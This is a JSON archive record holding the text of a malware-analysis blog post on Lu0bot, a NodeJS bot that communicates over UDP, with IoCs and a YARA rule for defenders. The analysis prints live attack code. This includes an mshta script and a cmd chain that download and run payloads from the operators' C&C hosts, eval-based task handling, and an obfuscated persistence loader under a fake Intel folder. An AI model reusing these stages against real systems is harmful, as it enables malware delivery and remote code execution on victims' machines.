@@ -1,0 +1,241 @@
+{
+    "id": "1f2e343b-5e4d-484c-bd34-0cea27f674c0",
+    "created_at": "2023-01-12T14:59:51.476008Z",
+    "updated_at": "2025-03-27T02:16:01.172819Z",
+    "deleted_at": null,
+    "sha1_hash": "9898531750b04fbc45593858d47e21abb79cae28",
+    "title": "2021-06-24 - Lu0bot – An unknown NodeJS malware using UDP",
+    "authors": "",
+    "file_creation_date": "2022-05-28T01:21:15Z",
+    "file_modification_date": "2022-05-28T01:21:15Z",
+    "file_size": 1963183,
+    "plain_text": "# Lu0bot – An unknown NodeJS malware using UDP\n\n**[fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/](https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/)**\n\nfumko June 24, 2021\n\n#### In February/March 2021, A curious lightweight payload has been observed from a well- known load seller platform. At the opposite of classic info-stealers being pushed at an industrial level, this one is widely different in the current landscape/trends. Feeling being in front of a grey box is somewhat a stressful problem, where you have no idea about what it could be behind and how it works, but in another way, it also means that you will learn way more than a usual standard investigation.\n\n I didn’t feel like this since Qulab and at that time, this AutoIT malware gave me some headaches due to its packer. but after cleaning it and realizing it’s rudimentary, the challenge was over. In this case, analyzing NodeJS malware is definitely another approach.\n\n I will just expose some current findings of it, I don’t have all answers, but at least, it will door opened for further researches.\n\n Disclaimer: I don’t know the real name of this malware.\n\n## Minimalist C/C++ loader\n\n\n-----\n\n#### When lu0bot is deployed on a machine, the first stage is a 2.5 ko lightweight payload which has only two section headers.\n\n Curious PE Sections Written in C/C++, only one function has been developped.\n```\nvoid start()\n{\n char *buff; \n buff = CmdLine;\n do\n {\n  buff -= 'NPJO';   // The key seems random after each build\n  buff += 4;    \n }\n while ( v0 < &CmdLine[424] );\n WinExec(CmdLine, 0);  // ... to the moon ! \\o/\n ExitProcess(0);\n}\n\n This rudimentary loop is focused on decrypting a buffer, unveiling then a one-line JavaScript code executed through WinExec()\n\n Simple sub loop for unveiling the next stage Indeed, MSHTA is used executing this malicious script. So in term of monitoring, it’s easy to catch this interaction.\n\n```\n\n-----\n\n```\nmshta javascript: document.write();\n42;\ny =\nunescape('%312%7Eh%74t%70%3A%2F%2F%68r%692%2Ex%79z%2Fh%72i%2F%3F%321%616%654%62%7E%321\n103;\ntry {\n  x = 'WinHttp';\n  127;\n  x = new ActiveXObject(x + '.' + x + 'Request.5.1');\n  26;\n  x.open('GET', y[1] + '&a=' + escape(window.navigator.userAgent), !1);\n  192;\n  x.send();\n  37;\n  y = 'ipt.S';\n  72;\n  new ActiveXObject('WScr' + y + 'hell').Run(unescape(unescape(x.responseText)), 0,\n!2);\n  179;\n} catch (e) {};\n234;;\nwindow.close();\"\n\n## Setting up NodeJs\n\n#### Following the script from above, it is designed to perform an HTTP GET request from a C&C (let’s say it’s the first C&C Layer). Then the response is executed as an ActiveXObject.\nnew ActiveXObject('WScr' + y + 'hell').Run(unescape(unescape(x.responseText)), 0, !2);\n\n Let’s inspect the code (response) step by step\ncmd /d/s/c cd /d \"%ALLUSERSPROFILE%\" & mkdir \"DNTException\" & cd \"DNTException\" & dir\n/a node.exe [...]\n\n Set the console into %ALLUSERPROFILE% path Create fake folder DNTException\n\n```\n\n-----\n\n```\n[...] || ( echo x new ActiveXObject( WinHttp.WinHttpRequest.5.1 );\n      x.Open(\"GET\",unescape(WScript.Arguments(0^)^),false^);\n      x.Send(^);\n      b = new ActiveXObject(\"ADODB.Stream\"^);\n      b.Type=1;\n      b.Open(^);\n      b.Write(x.ResponseBody^);\n      b.SaveToFile(WScript.Arguments(1^),2^); \n      > get1618489872131.txt \n      & cscript /nologo /e:jscript get1618489872131.txt \"http://hri2.xyz/hri/?\n%HEXVALUE%&b=%HEXVALUE%\" node.cab \n      & expand node.cab node.exe \n      & del get1618489872131.txt node.cab \n) [...]\n\n#### Generate a js code-focused into downloading a saving an archive that will be named “node.cab” Decompress the cab file with expand command and renamed it “node.exe” Delete all files that were generated when it’s done\n[...] & echo new ActiveXObject(\"WScript.Shell\").Run(WScript.Arguments(0),0,false); >\nget1618489872131.txt [...]\n\n Recreate a js script that will execute again some code\n[...] cscript /nologo /e:jscript get1618489872131.txt \"node -e\neval(FIRST_STAGE_NODEJS_CODE)\" & del get1618489872131.txt [...]\n\n In the end, this whole process is designed for retrieving the required NodeJS runtime.\n\n Lu0bot nodejs loader initialization process\n\n```\n\n-----\n\n## Matryoshka Doll(J)s\n\n#### Luckily the code is in fact pretty well written and comprehensible at this layer. It is 20~ lines of code that will build the whole malware thanks to one and simple API call: eval.\n\n implistic lu0bot nodejs loader that is basically the starting point for everything\n From my own experience, I’m not usually confronted with malware using UDP protocol for communicating with C&C’s. Furthermore, I don’t think in the same way, it’s usual to switch from TCP to UDP like it was nothing. When I analyzed it for the first time, I found it odd to see so many noisy interactions in the machine with just two HTTP requests. Then I realized that I was watching the visible side of a gigantic iceberg…\n\n\n-----\n\n#### Well played OwO\n\n For those who are uncomfortable with NodeJS, the script is designed to sent periodically UDP requests over port 19584 on two specific domains. When a message is received, it is decrypted with a standard XOR decryption loop, the output is a ready-to-use code that will be executed right after with eval. Interestingly the first byte of the response is also part of the key, so it means that every time a response is received, it is likely dynamically different even if it’s the same one.\n\n In the end, lu0bot is basically working in that way\n\n\n-----\n\n#### lu0bot nodejs malware architecture After digging into each code executed, It really feels that you are playing with matryoshka dolls, due to recursive eval loops unveiling more content/functions over time. It’s also the reason why this malware could be simple and complex at the same time if you aren’t experienced with this strategy.\n\n The madness philosophy behind eval() calls\n\n\n-----\n\n#### For adding more nonsense it is using different encryption algorithms whatever during communications or storing variables content:\n\n XOR AES-128-CBC Diffie-Hellman Blowfish\n\n## Understanding Lu0bot variables\n\n### S (as Socket)\n\n#### Fundamental Variable UDP communications with C&C’s Receiving main classes/variables Executing “main branches” code\n```\nfunction om1(r,q,m)   # Object Message 1\n |--> r # Remote Address Information\n |--> q # Query \n |--> m # Message\nfunction c1r(m,o,d)    # Call 1 Response\n |--> m # Message\n |--> o # Object\n |--> d # Data\nfunction sc/c1/c2/c3(m,r) # SetupCall/Call1/Call2/Call3\n |--> m # Message\n |--> r # Remote Address Information\nfunction ss(p,q,c,d)   # ScriptSetup / SocketSetup\n |--> p # Personal ID\n |--> q # Query \n |--> c # Crypto/Cipher\n |--> d # Data\nfunction f()       # UDP C2 communications\n\n### KO (as Key Object ?)\n\n#### lu0bot mastermind Containing all bot information\n C&C side Client side storing fundamental handle functions for task manager(s)\n eval | buffer | file\n\n```\n\n-----\n\n```\nko {\n  pid:   # Personal ID\n  aid:   # Address ID (C2)\n  q:    # Query\n  t:    # Timestamp\n  lq: {\n       # Query List\n  },\n  pk:   # Public Key\n  k:    # Key\n  mp: {}, # Module Packet/Package \n  mp_new: [Function: mp_new],    # New Packet/Package in the queue\n  mp_get: [Function: mp_get],    # Get Packet/Package from the queue\n  mp_count: [Function: mp_count],  # Packer/Package Counter\n  mp_loss: [Function: mp_loss],   # ???\n  mp_del: [Function: mp_del],    # Delete Packet/Package from the queue\n  mp_dtchk: [Function: mp_dtchk],  # Data Check\n  mp_dtsum: [Function: mp_dtsum],  # Data Sum\n  mp_pset: [Function: mp_pset],   # Updating Packet/Package from the queue\n  h: {                # Handle\n    eval: [Function],       \n    bufwrite: [Function],\n    bufread: [Function],\n    filewrite: [Function],\n    fileread: [Function]\n  },\n  mp_opnew: [Function: mp_opnew],  # Create New\n  mp_opstat: [Function: mp_opstat], # get stats from MP\n  mp_pget: [Function],        # Get Packet/Package from MP\n  mp_pget_ev: [Function]       # Get Packet/Package Timer Intervals\n}\n\n### MP\n\n#### Module Package/Packet/Program ? Monitoring and logging an executed task/script.\n\n```\n\n-----\n\n```\nmp:               \n  { key:            # Key is Personal ID\n   { id:,          # Key ID (Event ID)\n    pid:,          # Personal ID\n    gen:,         # Starting Timestamp\n    last:,         # Last Tick Update\n    tmr: [Object],      # Timer\n    p: {},          # Package/Packet\n    psz:           # Package/Packet Size\n    btotal:         # ???\n    type: 'upload',     # Upload/Download type\n    hn: 'bufread',      # Handle name called\n    target: 'binit',     # Script name called (From C&C)\n    fp:,          # Buffer\n    size:,         # Size\n    fcb: [Function],     # FailCallBack\n    rcb: [Function],     # ???\n    interval: 200,      # Internval Timer\n    last_sev: 1622641866909, # Last Timer Event\n    stmr: false       # Script Timer\n}\n\n## Ingenious trick for calling functions dynamically\n\n#### Usually, when you are reversing malware, you are always confronted (or almost every time) about maldev hiding API Calls with tricks like GetProcAddress or Hashing.\nfunction sc(m, r) {\n  if (!m || m.length < 34) return;\n  m[16] ^= m[2];\n  m[17] ^= m[3];\n  var l = m.readUInt16BE(16);\n  if (18 + l > m.length) return;\n  var ko = s.pk[r.address + ' ' + r.port];\n  var c = crypto.createDecipheriv('aes-128-cbc', ko.k, m.slice(0, 16));\n  m = Buffer.concat([c.update(m.slice(18, 18 + l)), c.final()]);\n  m = {\n    q: m.readUInt32BE(0),\n    c: m.readUInt16BE(4),\n    ko: ko,\n    d: m.slice(6)\n  };\n  l = 'c' + m.c;    // Function name is now saved\n  if (s[l]) s[l](m, r);\n}\n\n As someone that is not really experienced in the NodeJS environment, I wasn’t really triggering the trick performed here but for web dev, I would believe this is likely obvious (or maybe I’m wrong). The thing that you need to really take attention to is what is happening with “c” char and m.c.\n\n```\n\n-----\n\n#### By reading the official NodeJs documemtation: The Buffer.readUInt16BE() method is an inbuilt application programming interface of class Buffer within the Buffer module which is used to read 16-bit value from an allocated buffer at a specified offset.\n```\nBuffer.readUInt16BE( offset )\n\n In this example it will return in a real case scenario the value “1”, so with the variable l, it will create “c1”, a function stored into the global variable s. In the end, s[“c1”](m,r) is also meaning s.c1(m,r).\n\n## A well-done task manager architecture\n\n### Q variable used as Macro PoV Task Manager\n\n#### “Q” is designed to be the main task manager. If Q value is not on LQ, adding it into LQ stack, then executing the code content (with eval) from m (message).\nif (!lq[q]) {                // if query not in the queue, creating it\n  lq[q] = [0, false];\n  setTimeout(function() {\n    delete lq[q]\n  }, 30000);\n  try {\n    for (var p = 0; p < m.d.length; p++)\n      if (!m.d[p]) break;\n    var es = m.d.slice(0, p).toString(); // es -> Execute Script\n    m.d = m.d.slice(p + 1);\n    if (!m.d.length) m.d = false;\n    eval(es)               // eval, our sweat eval...\n  } catch (e) {\n    console.log(e);\n  }\n  return;\n}\nif (lq[q][0]) {\n  s.ss(ko.pid, q, 1, lq[q][1]);\n}\n\n### MP variable used as Micro PoV Task Manager\n\n#### “MP” is designed to execute tasks coming from C&C’s. Each task is executed independantly!\n\n```\n\n-----\n\n```\nfunction mp_opnew(m) {\n  var o = false;            // o -> object\n  try {\n    o = JSON.parse(m.d);       // m.d (message.data) is saved into o\n  } catch (e) {}\n  if (!o || !o.id) return c1r(m, -1); // if o empty, or no id, returning -1 \n  if (!ko.h[o.hn]) return c1r(m, -2); // if no functions set from hn, returning -2\n  var mp = ko.mp_new(o.id);      // Creating mp --------------------------  for (var k in o) mp[k] = o[k];                        |\n  var hr = ko.h[o.hn](mp);                           |\n  if (!hr) {                                  |\n    ko.mp_del(mp);                              |\n    return c1r(m, -3)        // if hr is incomplete, returning -3   |\n  }                                       |\n  c1r(m, hr);             // returning hr             | \n}                                         |\n                                         |\nfunction mp_new(id, ivl) {  <---------------------------------------------------  var ivl = ivl ? ivl : 5000;     // ivl -> interval\n  var now = Date.now();    \n  if (!lmp[id]) lmp[id] = {      // mp list \n    id: id,\n    pid: ko.pid,\n    gen: now,\n    last: now,\n    tmr: false,\n    p: {},\n    psz: 0,\n    btotal: 0\n  };\n  var mp = lmp[id];\n  if (!mp.tmr) mp.tmr = setInterval(function() {\n    if (Date.now() - mp.last > 1000 * 120) {\n      ko.mp_del(id);\n      return;\n    }\n    if (mp.tcb) mp.tcb(mp);\n  }, ivl);\n  mp.last = now;\n  return mp;\n}\n\n### O (Object) – C&C Task\n\n#### This object is receiving tasks from the C&C. Technically, this is (I believed) one of the most interesting variable to track with this malware..\n\n```\n\n-----\n\n#### It contains 4 or 5 values\n type.\n upload download hn : Handle Name sz: Size (Before Zlib decompression) psz: ??? target: name of the command/script received from C&C\n```\n// o content\n{\n    id: 'XXXXXXXXXXXXXXXXX',\n    type: 'upload',\n    hn: 'eval',\n    sz: 9730,\n    psz: 1163,\n    target: 'bootstrap-base.js',\n}\n\n on this specific scenario, it’s uploading on the bot a file from the C&C called “bootstrap- base.js” and it will be called with the handle name (hn) function eval.\n\n### Summary\n\n## Aggressive telemetry harvester\n\n```\n\n-----\n\n#### Usually, when malware is gathering information from a new bot it is extremely fast but here for exactly 7/8 minutes your VM/Machine is literally having a bad time.\n\n Preparing environment\n\n Gathering system information\n\nProcess info\n```\ntasklist /fo csv /nh\nwmic process get processid,parentprocessid,name,executablepath /format:csv\nqprocess *\n\n```\nNetwork info\n```\nipconfig.exe /all\nroute.exe print\nnetstat.exe -ano\nsysteminfo.exe /fo csv\n\n```\nSaving Environment & User path(s)\n\n\n-----\n\n#### Saving environment variables EI_HOME (EI = EINFO)\n```\nEI_DESKTOP\n |--> st.env['EI_HOME'] + '\\\\Desktop';\nEI_DOCUMENTS \n |--> st.env['EI_HOME'] + '\\\\Documents';\n |--> st.env['EI_HOME'] + '\\\\My Documents';\nEI_PROGRAMFILES1\n |--> var tdir1 = exports.env_get('ProgramFiles');\n |--> var tdir2 = exports.env_get('ProgramFiles(x86)');\n |--> st.env['EI_HOME'].substr(0,1) + '\\\\Program Files (x86)';\nEI_PROGRAMFILES2\n |--> var tdir3 = exports.env_get('ProgramW6432');\n |--> st.env['EI_HOME'].substr(0,1) + '\\\\Program Files';\nEI_DOWNLOADS\n |--> st.env['EI_HOME'] + '\\\\Downloads';\n\n```\nConsole information\n\n#### These two variables are basically conditions to check if the process was performed. (ISCONPROBED is set to true when the whole thing is complete).\n```\nenv[\"ISCONPROBED\"] = false;\nenv[\"ISCONSOLE\"] = true;\n\n Required values for completing the task..\nenv[\"WINDIR\"] = val;\nenv[\"TEMP\"] = val;\nenv[\"USERNAME_RUN\"] = val;\nenv[\"USERNAME\"] = val;\nenv[\"USERNAME_SID\"] = s;\nenv[\"ALLUSERSPROFILE\"] = val;\nenv[\"APPDATA\"] = val;\n\n Checking old windows versions\n\n Curiously, it’s checking if the bot is using an old Microsoft Windows version.\n\n```\n\n-----\n\n#### NT 5.X – Windows 2000/XP NT 6.0 – Vista\n```\nfunction check_oldwin(){\n  var osr = os.release();\n  if(osr.indexOf('5.')===0 || osr.indexOf('6.0')===0) return osr;\n  return false;\n}\nexports.check_oldwin = check_oldwin;\n\n This is basically a condition after for using an alternative command with pslist\nfunction ps_list_alt(cb){\n  var cmd = ['qprocess','*'];\n  if(check_oldwin()) cmd.push('/system');\n  ....\n\n Checking ADS streams for hiding content into it for later\n\n Checking Alternative Data Streams\n\n Harvesting functions 101\n\n```\n\n-----\n\n```\nbufstore_save(key,val,opts)     # Save Buffer Storage \nbufstore_get(key,clear)       # Get Buffer Storage \nstrstrip(str)            # String Strip\nname_dirty_fncmp(f1,f2)       # Filename Compare (Dirty)\ndirvalidate_dirty(file)       # Directory Checking (Dirty)\nfile_checkbusy(file)        # Checking if file is used\nrun_detached(args,opts,show)    # Executing command detached\nrun(args,opts,cb)          # Run command\ncheck_oldwin()           # Check if Bot OS is NT 5.0 or NT 6.0\nps_list_alt(cb)           # PS List (Alternative way)\nps_list_tree(list,results,opts,pid) # PS List Tree\nps_list(arg,cb)           # PS list \nps_exist(pid)            # Check if PID Exist\nps_kill(pid)            # Kill PID\nreg_get_parse(out)         # Parsing Registry Query Result\nreg_hkcu_get()           # Get HKCU\nreg_hkcu_replace(path)       # Replace HKCU Path\nreg_get(key,cb)           # Get Content\nreg_get_dir(key,cb)         # Get Directory\nreg_get_key(key,cb)         # Get SubKey\nreg_set_key(key,value,type,cb)   # Set SubKey\nreg_del_key(key,force,cb)      # Del SubKey\nget_einfo_1(ext,cb)         # Get EINFO Step 1\ndirlistinfo(dir,limit)       # Directory Listing info \nget_einfo_2(fcb)          # Get EINFO Step 2\nenv_get(key,kv,skiple)       # Get Environment\nconsole_get(cb)           # Get Console environment variables\nconsole_get_done(cb,err)      # Console Try/Catch callback\nconsole_get_s0(ccb)         # Console Step 0\nconsole_get_s1(ccb)         # Console Step 1\nconsole_get_s2(ccb)         # Console Step 2\nconsole_get_s3(ccb)         # Console Step 3\nads_test()             # Checking if bot is using ADS streams\ndiskser_get_parse(dir,out)     # Parse Disk Serial command results\ndiskser_get(cb)           # Get Disk Serial\nprepare_dirfile_env(file,cb)    # Prepare Directory File Environment\nprepare_file_env(file,cb)      # Prepare File Environment\nhash_md5_var(val)          # MD5 Checksum\ngetosinfo()             # Get OS Information\nrand(min, max)           # Rand() \\o/\nipctask_start()           # IPC Task Start (Interprocess Communication)\nipctask_tick()           # IPC Task Tick (Interprocess Communication)\nbaseinit_s0(cb)           # Baseinit Step 0\nbaseinit_s1(cb)           # Baseinit Step 1\nbaseinit_s2(cb)           # Baseinit Step 2\nbaseinit_einfo_1_2(cb)       # Baseinit EINFO\n\n## Funky Persistence\n\n#### The persistence is saved in the classic HKCU Run path\n\n```\n\n-----\n\n```\n[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Intel Management Engine Components 4194521778\"=\"wscript.exe /t:30 /nologo /e:jscript\n\\\"C:\\ProgramData\\Intel\\Intel(R) Management Engine Components\\Intel MEC 750293792\\\"\n\\\"C:\\ProgramData\\Intel\\Intel(R) Management Engine Components\\\" 2371015226\"\n\n#### Critical files are stored into a fake “Intel” folder in ProgramData.\nProgramData\n  |-- Intel\n    |-- Intel(R) Management Engine Components\n      |--> Intel MEC 246919961\n      |--> Intel MEC 750293792\n\n Intel MEC 750293792\nnew ActiveXObject(\"WScript.shell\").Run('\"C:\\ProgramData\\DNTException\\node.exe\" \"' +\nWScript.Arguments(0) + '\\Intel MEC 246919961\" ' + WScript.Arguments(1), 0, false);\n\n Intel MEC 246919961\nvar c = new Buffer((process.argv[2] + 38030944).substr(0, 8));\nc = require(\"crypto\").createDecipheriv(\"bf\", c, c);\nglobal[\"\\x65\\x76\" + \"\\x61\\x6c\"](Buffer.concat([c.update(new\nBuffer(\"XSpPi1eP/0WpsZRcbNXtfiw8cHqIm5HuTgi3xrsxVbpNFeB6S6BXccVSfA/JcVXWdGhhZhJf4wHv0P\n \"\\x62\\x61\\x73\" + \"\\x65\\x36\\x34\")), c.final()]).toString());\n\n The workaround is pretty cool in the end\n\n WScript is launched after waiting for 30s JScript is calling “Intel MEC 750293792” “Intel MEC 750293792” is executing node.exe with arguments from the upper layer This setup is triggering the script “Intel MEC 246919961”\n the Integer value from the upper layer(s) is part of the Blowfish key generation global[“\\x65\\x76” + “\\x61\\x6c”] is in fact hiding an eval call the encrypted buffer is storing the lu0bot NodeJS loader.\n\n## Ongoing troubleshooting in production ?\n\n#### It is possible to see in some of the commands received, some lines of codes that are disabled. Unknown if it’s intended or no, but it’s pretty cool to see about what the maldev is working.\n\n```\n\n-----\n\n#### It feels like a possible debugging scenario for understanding an issue.\n\n## Outdated NodeJS still living and kickin’\n\n#### Interestingly, lu0bot is using a very old version of node.exe, way older than could be expected.\n\n\n-----\n\n#### node.exe used by lu0bot is an outdated one This build (0.10.48), is apparently from 2016, so in term of functionalities, there is a little leeway for exploiting NodeJS, due that most of its APIs wasn’t yet implemented at that time.\n\n NodeJs used is from a 2016 build.\n\n\n-----\n\n#### I feel old by looking\n\n the changelog… The issue mentioned above is “seen” when lu0bot is pushing and executing “bootstrap- base.js“. On build 0.10.XXX, “Buffer” wasn’t fully implemented yet. So the maldev has implemented missing function(s) on this specific version, I found this “interesting”, because it means it will stay with a static NodeJS runtime environment that won’t change for a while (or likely never). This is a way for avoiding cryptography troubleshooting issues, between updates it could changes in implementations that could break the whole project. So fixed build is avoiding maintenance or unwanted/unexpected hotfixes that could caused too much cost/time consumption for the creator of lu0bot (everything is business \\o/).\n\n Interesting module version value in bootstrap-base.js Of course, We couldn’t deny that lu0bot is maybe an old malware, but this statement needs to be taken with cautiousness.\n\n\n-----\n\n#### By looking into bootstrap-base.js, the module is apparently already on version 6.0.15, but based on experience, versioning is always a confusing thing with maldev(s), they have all a different approach, so with current elements, it is pretty hard to say more due to the lack of samples.\n\n## What is the purpose of lu0bot ?\n\n#### Well, to be honest, I don’t know… I hate making suggestions with too little information, it’s dangerous and too risky. I don’t want to lead people to the wrong path. It’s already complicated to explain something with no “public” records, even more, when it is in a programming language for that specific purpose. At this stage, It’s smarter to focus on what the code is able to do, and it is certain that it’s a decent data collector.\n\n Also, this simplistic and efficient NodeJS loader code saved at the core of lu0bot is basically everything and nothing at the same time, the eval function and its multi-layer task manager could lead to any possibilities, where each action could be totally independent of the others, so thinking about features like :\n\n Backdoor ? Loader ? RAT ? Infostealer ?\n\n All scenario are possible, but as i said before I could be right or totally wrong.\n\n## Where it could be seen ?\n\n#### Currently, it seems that lu0bot is pushed by the well-known load seller Garbage Cleaner on EU/US Zones irregularly with an average of possible 600-1000 new bots (each wave), depending on the operator(s) and days.\n\n## Appendix\n\n### IoCs\n\n#### IP\n\n 5.188.206[.]211\n\n lu0bot loader C&C’s (HTTP)\n\n hr0[.]xyz hr1[.]xyz hr2[.]xyz\n\n\n-----\n\n#### hr3[.]xyz hr4[.]xyz hr5[.]xyz hr6[.]xyz hr7[.]xyz hr8[.]xyz hr9[.]xyz hr10[.]xyz\n\n lu0bot main C&C’s (UDP side)\n\n lu00[.]xyz lu01[.]xyz lu02[.]xyz lu03[.]xyz\n\n### Yara\n```\nrule lu0bot_cpp_loader\n{\n  meta:\n    author = \"Fumik0_\"\n    description = \"Detecting lu0bot C/C++ lightweight loader\"\n  strings:\n    $hex_1 = {\n      BE 00 20 40 00 \n      89 F7 \n      89 F0\n      81 C7 ?? 01 00 00 \n      81 2E ?? ?? ?? ?? \n      83 C6 04 \n      39 FE \n      7C ?? \n      BB 00 00 00 00 \n      53 50 \n      E8 ?? ?? ?? ??\n      E9 ?? ?? ?? ??\n    }\n  condition:\n    (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and\n    (filesize > 2KB and filesize < 5KB) and \n    any of them\n}\n\n IoCs\n\n```\n\n-----\n\n```\nfce3d69b9c65945dcfbb74155f2186626f2ab404e38117f2222762361d7af6e2 Lu0bot loader.exe\nc88e27f257faa0a092652e42ac433892c445fc25dd445f3c25a4354283f6cdbf Lu0bot loader.exe\nb8b28c71591d544333801d4673080140a049f8f5fbd9247ed28064dd80ef15ad Lu0bot loader.exe\n5a2264e42206d968cbcfff583853a0e0d4250f078a5e59b77b8def16a6902e3f Lu0bot loader.exe\nf186c2ac1ba8c2b9ab9b99c61ad3c831a6676728948ba6a7ab8345121baeaa92 Lu0bot loader.exe\n8d8b195551febba6dfe6a516e0ed0f105e71cf8df08d144b45cdee13d06238ed response1.bin\n214f90bf2a6b8dffa8dbda4675d7f0cc7ff78901b3c3e03198e7767f294a297d response2.bin\nc406fbef1a91da8dd4da4673f7a1f39d4b00fe28ae086af619e522bc00328545 response3.bin\nccd7dcdf81f4acfe13b2b0d683b6889c60810173542fe1cda111f9f25051ef33 Intel MEC 246919961\ne673547a445e2f959d1d9335873b3bfcbf2c4de2c9bf72e3798765ad623a9067 Intel MEC 750293792\n\n### Example of lu0bot interaction\n\n```\n\n-----\n\n```\nko\n{ pid: 'XXXXXX',\n aid: '5.188.206.211 19584',\n q: XXXXXXXXXX, \n t: XXXXXXXXXXXXX,\n lq: \n  { ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 30 00 00 00 00 09 00 00 26 02> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 74 72 75 65> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 74 72 75 65> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 37 39 38> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 37 39 38> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n   ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ] },\n pk: 'BASE64_ENCRYPTED',\n k: <Buffer 3c 60 22 73 97 cc 76 22 bc eb b5 79 46 3d 05 9e>,\n mp: \n  { XXXXXXXXXXXX: \n   { id: 'XXXXXXXXXXXX',\n    pid: 'XXXXXXX',\n    gen: XXXXXXXXXXXXX,\n    last: XXXXXXXXXXXXX,\n    tmr: [Object],\n    p: {},\n    psz: 1163,\n    btotal: 0,\n    type: 'download',\n    hn: 'bufread',\n    target: 'binit',\n    fp: <Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad\n44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb\nc9 ...>,i\n\n```\n\n-----\n\n```\n    size: 798,\n    fcb: [Function],\n    rcb: [Function],\n    interval: 200,\n    last_sev: XXXXXXXXXXXXX,\n    stmr: false },\n   XXXXXXXXXXXX: \n   { id: 'XXXXXXXXXXXX',\n    pid: 'XXXXXXX',\n    gen: XXXXXXXXXXXXX,\n    last: XXXXXXXXXXXXX,\n    tmr: [Object],\n    p: {},\n    psz: 1163,\n    btotal: 0,\n    type: 'download',\n    hn: 'bufread',\n    target: 'binit',\n    fp: <Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad\n44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb\nc9 ...>,\n    size: 798,\n    fcb: [Function],\n    rcb: [Function],\n    interval: 200,\n    last_sev: XXXXXXXXXXXXX,\n    stmr: false },\n   XXXXXXXXXXXX: \n   { id: 'XXXXXXXXXXXX',\n    pid: 'XXXXXXX',\n    gen: XXXXXXXXXXXXX,\n    last: XXXXXXXXXXXXX,\n    tmr: [Object],\n    p: {},\n    psz: 1163,\n    btotal: 0,\n    type: 'download',\n    hn: 'bufread',\n    target: 'binit',\n    fp: <Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad\n44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb\nc9 ...>,\n    size: 798,\n    fcb: [Function],\n    rcb: [Function],\n    interval: 200,\n    last_sev: XXXXXXXXXXXXX,\n    stmr: false },\n   XXXXXXXXXXXX: \n   { id: 'XXXXXXXXXXXX',\n    pid: 'XXXXXXX',\n    gen: XXXXXXXXXXXXX,\n    last: XXXXXXXXXXXXX,\n    tmr: [Object],\n    p: {},\n\n```\n\n-----\n\n```\n    psz: 1163,\n    btotal: 0,\n    type: 'download',\n    hn: 'bufread',\n    target: 'binit',\n    fp: <Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad\n44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb\nc9 ...>,\n    size: 798,\n    fcb: [Function],\n    rcb: [Function],\n    interval: 200,\n    last_sev: XXXXXXXXXXXXX,\n    stmr: false },\n   XXXXXXXXXXXX: \n   { id: 'XXXXXXXXXXXX',\n    pid: 'XXXXXXX',\n    gen: XXXXXXXXXXXXX,\n    last: XXXXXXXXXXXXX,\n    tmr: [Object],\n    p: {},\n    psz: 1163,\n    btotal: 0,\n    type: 'download',\n    hn: 'bufread',\n    target: 'binit',\n    fp: <Buffer 1f 8b 08 00 00 00 00 00 00 0b 95 54 db 8e 9b 30 10 fd 95 c8 4f ad\n44 91 31 c6 80 9f 9a 26 69 1b 29 9b 8d b2 59 f5 a1 54 91 81 a1 41 21 18 61 92 6d bb\nc9 ...>,\n    size: 798,\n    fcb: [Function],\n    rcb: [Function] } },\n h: \n  { eval: [Function],\n   bufwrite: [Function],\n   bufread: [Function],\n   filewrite: [Function],\n   fileread: [Function] },\n mp_pget: [Function],\n mp_pget_ev: [Function],\n mp_new: [Function: mp_new],\n mp_get: [Function: mp_get],\n mp_count: [Function: mp_count],\n mp_loss: 